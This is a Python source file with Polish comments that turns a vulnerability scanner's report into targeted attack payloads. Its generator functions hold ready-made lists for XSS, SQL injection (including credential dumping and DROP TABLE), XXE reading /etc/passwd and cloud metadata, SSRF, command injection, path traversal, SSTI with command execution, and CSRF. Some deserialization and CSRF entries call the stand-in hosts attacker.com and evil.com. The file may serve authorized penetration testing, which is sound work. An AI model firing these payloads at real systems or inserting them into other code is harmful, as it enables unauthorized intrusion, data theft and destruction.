import json
import random

def generate_targeted_payloads(scan_report, base_payloads):
    """Generuje zaawansowane payloady na podstawie wyników skanera Go"""
    
    targeted_payloads = []
    vulnerability_patterns = scan_report.get('vulnerabilities', [])
    context_matches = scan_report.get('context_matches', {})
    
    # Mapowanie podatności na zaawansowane payloady
    vuln_mapping = {
        # SQL Injection patterns
        'sql_injection': generate_sql_payloads,
        'length_validator': generate_length_bypass_payloads,
        'size_validator': generate_size_bypass_payloads,
        'array_index_check': generate_array_overflow_payloads,
        
        # XSS patterns
        'xss': generate_advanced_xss_payloads,
        'equals_type_check': generate_type_confusion_payloads,
        'type_casting': generate_type_casting_payloads,
        
        # Command Injection
        'command_injection': generate_command_injection_payloads,
        'file_handling': generate_path_traversal_payloads,
        'network_io': generate_ssrf_payloads,
        
        # Deserialization
        'insecure_deserialization': generate_deserialization_payloads,
        'reflection': generate_reflection_payloads,
        'serialization': generate_serialization_payloads,
        
        # Other patterns
        'path_traversal': generate_path_traversal_payloads,
        'race_condition': generate_race_condition_payloads,
        'idor': generate_idor_payloads,
        'csrf': generate_csrf_payloads,
        'ssti': generate_ssti_payloads
    }
    
    # Generuj payloady dla każdej znalezionej podatności
    for vuln in vulnerability_patterns:
        vuln_type = vuln['pattern']
        if vuln_type in vuln_mapping:
            generated = vuln_mapping[vuln_type](base_payloads, vuln, context_matches)
            targeted_payloads.extend(generated)
    
    return targeted_payloads

def generate_advanced_xss_payloads(base_payloads, vulnerability, context_matches):
    """Generuje zaawansowane payloady XSS na podstawie bazowych"""
    
    advanced_payloads = []
    
    # Bazowe payloady XSS z pliku
    base_xss = [p for p in base_payloads if p['category'] == 'HTML']
    
    # Zaawansowane techniki XSS
    advanced_techniques = [
        # Mutation XSS
        {'suffix': '<img src=x onerror=alert(1)>', 'category': 'mXSS'},
        {'suffix': '<svg onload=alert(1)>', 'category': 'mXSS'},
        {'suffix': '<math href=javascript:alert(1)>', 'category': 'mXSS'},
        
        # DOM XSS
        {'suffix': '"><script>alert(1)</script>', 'category': 'DOM_XSS'},
        {'suffix': 'javascript:alert(1)', 'category': 'DOM_XSS'},
        {'suffix': 'data:text/html,<script>alert(1)</script>', 'category': 'DOM_XSS'},
        
        # Template Injection
        {'suffix': '{{7*7}}', 'category': 'SSTI'},
        {'suffix': '${7*7}', 'category': 'SSTI'},
        {'suffix': '<%= 7*7 %>', 'category': 'SSTI'},
        
        # Context-specific
        {'suffix': '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', 'category': 'ENCODED_XSS'},
        {'suffix': '&lt;script&gt;alert(1)&lt;/script&gt;', 'category': 'HTML_ENTITY_XSS'}
    ]
    
    for base in base_xss:
        for technique in advanced_techniques:
            advanced_payload = {
                'inputField': base['inputField'] + technique['suffix'],
                'category': f"ADV_{technique['category']}",
                'targeted_vulnerability': vulnerability['pattern'],
                'confidence': 0.8
            }
            advanced_payloads.append(advanced_payload)
    
    return advanced_payloads

def generate_sql_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady SQL Injection"""
    
    sql_payloads = []
    
    # Podstawowe payloady SQL
    basic_sql = [
        {"inputField": "' OR '1'='1' -- ", "category": "SQL"},
        {"inputField": "' UNION SELECT username, password FROM users--", "category": "SQL"},
        {"inputField": "' AND 1=1--", "category": "SQL"},
        {"inputField": "' AND 1=2--", "category": "SQL"},
        {"inputField": "'; DROP TABLE users--", "category": "SQL"},
        {"inputField": "' OR SLEEP(5)--", "category": "SQL_TIME"},
        {"inputField": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "category": "SQL_TIME"}
    ]
    
    # Zaawansowane techniki SQLi
    advanced_sql = [
        # Boolean-based Blind
        {"inputField": "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "category": "SQL_BOOLEAN"},
        {"inputField": "' AND (SELECT ASCII(SUBSTRING((SELECT USER()),1,1)))>0--", "category": "SQL_BOOLEAN"},
        
        # Error-based
        {"inputField": "' AND EXTRACTVALUE(1,CONCAT(0x5c,@@version))--", "category": "SQL_ERROR"},
        {"inputField": "' AND GTID_SUBSET(@@version,0)--", "category": "SQL_ERROR"},
        
        # Union-based
        {"inputField": "' UNION SELECT 1--", "category": "SQL_UNION"},
        {"inputField": "' UNION SELECT 1,2--", "category": "SQL_UNION"},
        {"inputField": "' UNION SELECT 1,2,3--", "category": "SQL_UNION"},
        {"inputField": "' UNION SELECT @@version,2,3--", "category": "SQL_UNION"}
    ]
    
    for payload in basic_sql + advanced_sql:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.9
        sql_payloads.append(payload)
    
    return sql_payloads

def generate_deserialization_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady deserializacji"""
    
    deserialization_payloads = []
    
    # Java deserialization payloads
    java_deserialization = [
        {"inputField": "rO0ABX", "category": "JAVA_DESERIALIZATION"},
        {"inputField": "aced0005", "category": "JAVA_DESERIALIZATION"},
        {"inputField": "\\xac\\xed\\x00\\x05", "category": "JAVA_DESERIALIZATION"}
    ]
    
    # JSON deserialization payloads
    json_deserialization = [
        {"inputField": '{"@type":"java.net.URL","val":"http://attacker.com"}', "category": "JSON_DESERIALIZATION"},
        {"inputField": '{"@type":"java.net.InetAddress","val":"attacker.com"}', "category": "JSON_DESERIALIZATION"},
        {"inputField": '{"@type":"com.thoughtworks.xstream.mapper.DefaultMapper"}', "category": "JSON_DESERIALIZATION"}
    ]
    
    # XML deserialization (XXE)
    xxe_payloads = [
        {"inputField": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "category": "XXE"},
        {"inputField": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "category": "XXE"}
    ]
    
    for payload in java_deserialization + json_deserialization + xxe_payloads:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.7
        deserialization_payloads.append(payload)
    
    return deserialization_payloads

def generate_ssrf_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady SSRF"""
    
    ssrf_payloads = []
    
    ssrf_payload_list = [
        # Internal services
        {"inputField": "http://localhost:22", "category": "SSRF_INTERNAL"},
        {"inputField": "http://127.0.0.1:3306", "category": "SSRF_INTERNAL"},
        {"inputField": "http://internal.service", "category": "SSRF_INTERNAL"},
        
        # Cloud metadata
        {"inputField": "http://169.254.169.254/latest/meta-data/", "category": "SSRF_AWS"},
        {"inputField": "http://metadata.google.internal/computeMetadata/v1/", "category": "SSRF_GCP"},
        
        # File protocol
        {"inputField": "file:///etc/passwd", "category": "SSRF_FILE"},
        {"inputField": "file:///c:/windows/win.ini", "category": "SSRF_FILE"},
        
        # Other protocols
        {"inputField": "gopher://127.0.0.1:25/xHELO%20localhost", "category": "SSRF_GOPHER"},
        {"inputField": "dict://127.0.0.1:22/info", "category": "SSRF_DICT"}
    ]
    
    for payload in ssrf_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.8
        ssrf_payloads.append(payload)
    
    return ssrf_payloads

def generate_command_injection_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady command injection"""
    
    command_payloads = []
    
    cmd_payloads = [
        # Unix command injection
        {"inputField": "; ls -la /", "category": "COMMAND_UNIX"},
        {"inputField": "| cat /etc/passwd", "category": "COMMAND_UNIX"},
        {"inputField": "& whoami", "category": "COMMAND_UNIX"},
        {"inputField": "`id`", "category": "COMMAND_UNIX"},
        {"inputField": "$(id)", "category": "COMMAND_UNIX"},
        
        # Windows command injection
        {"inputField": "| dir C:\\", "category": "COMMAND_WINDOWS"},
        {"inputField": "& whoami", "category": "COMMAND_WINDOWS"},
        {"inputField": "; ipconfig", "category": "COMMAND_WINDOWS"},
        
        # Blind command injection
        {"inputField": "| sleep 5", "category": "COMMAND_BLIND"},
        {"inputField": "& ping -c 5 127.0.0.1", "category": "COMMAND_BLIND"}
    ]
    
    for payload in cmd_payloads:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.7
        command_payloads.append(payload)
    
    return command_payloads

def generate_path_traversal_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady path traversal"""
    
    path_payloads = []
    
    traversal_payloads = [
        # Basic traversal
        {"inputField": "../../../etc/passwd", "category": "PATH_TRAVERSAL"},
        {"inputField": "..\\..\\..\\windows\\win.ini", "category": "PATH_TRAVERSAL"},
        
        # Encoded traversal
        {"inputField": "..%2f..%2f..%2fetc%2fpasswd", "category": "PATH_TRAVERSAL_ENCODED"},
        {"inputField": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "category": "PATH_TRAVERSAL_UTF8"},
        
        # Absolute paths
        {"inputField": "/etc/passwd", "category": "PATH_TRAVERSAL_ABSOLUTE"},
        {"inputField": "C:\\Windows\\System32\\drivers\\etc\\hosts", "category": "PATH_TRAVERSAL_ABSOLUTE"}
    ]
    
    for payload in traversal_payloads:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.6
        path_payloads.append(payload)
    
    return path_payloads

def generate_ssti_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady SSTI"""
    
    ssti_payloads = []
    
    ssti_payload_list = [
        # Basic template injection
        {"inputField": "{{7*7}}", "category": "SSTI"},
        {"inputField": "${7*7}", "category": "SSTI"},
        {"inputField": "<%= 7*7 %>", "category": "SSTI"},
        
        # Command execution
        {"inputField": "{{''.__class__.__mro__[1].__subclasses__()}}", "category": "SSTI_PYTHON"},
        {"inputField": "${T(java.lang.Runtime).getRuntime().exec('whoami')}", "category": "SSTI_JAVA"},
        {"inputField": "<%= system('whoami') %>", "category": "SSTI_RUBY"}
    ]
    
    for payload in ssti_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.7
        ssti_payloads.append(payload)
    
    return ssti_payloads

def generate_idor_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady IDOR"""
    
    idor_payloads = []
    
    idor_payload_list = [
        # Parameter manipulation
        {"inputField": "../admin", "category": "IDOR"},
        {"inputField": "?id=1", "category": "IDOR"},
        {"inputField": "?user_id=0", "category": "IDOR"},
        {"inputField": "?account=administrator", "category": "IDOR"},
        
        # UUID manipulation
        {"inputField": "00000000-0000-0000-0000-000000000000", "category": "IDOR_UUID"},
        {"inputField": "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF", "category": "IDOR_UUID"}
    ]
    
    for payload in idor_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.5
        idor_payloads.append(payload)
    
    return idor_payloads

def generate_csrf_payloads(base_payloads, vulnerability, context_matches):
    """Generuje payloady CSRF"""
    
    csrf_payloads = []
    
    csrf_payload_list = [
        # CSRF payload templates
        {"inputField": "<form action='http://evil.com' method='POST'>", "category": "CSRF"},
        {"inputField": "<img src='http://target.com/logout'>", "category": "CSRF"},
        {"inputField": "<script>fetch('http://target.com/delete-account')</script>", "category": "CSRF"}
    ]
    
    for payload in csrf_payload_list:
        payload['targeted_vulnerability'] = vulnerability['pattern']
        payload['confidence'] = 0.6
        csrf_payloads.append(payload)
    
    return csrf_payloads

# Funkcje placeholder dla pozostałych typów podatności
def generate_length_bypass_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_size_bypass_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_array_overflow_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_type_confusion_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_type_casting_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_reflection_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_serialization_payloads(base_payloads, vulnerability, context_matches):
    return []

def generate_race_condition_payloads(base_payloads, vulnerability, context_matches):
    return []
